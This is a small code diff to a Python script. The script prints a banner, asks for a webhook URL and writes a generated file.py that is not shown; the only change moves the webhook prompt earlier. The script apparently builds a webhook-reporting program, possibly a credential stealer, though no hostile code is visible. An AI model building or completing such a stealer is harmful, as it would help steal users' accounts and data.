@@ -46,6 +46,8 @@ print(Fore.RED + """
                      ╚═╝░░╚═╝╚══════╝╚═════╝░╚═════╝░╚═╝
                                    """)
 
+webhook = ("            " + '"' + input(Fore.BLUE + "[+] Enter your webhook url: ") + '",\n' )
+
 f = open("file.py", "w+")
 
 f.write(r"""
@@ -288,7 +290,7 @@ except Exception as e:
 
 f.close()
 
-webhook = ("            " + '"' + input(Fore.BLUE + "[+] Enter your webhook url: ") + '",\n' )
+
 
 a_file = open("file.py", "r")
 list_of_lines = a_file.readlines()
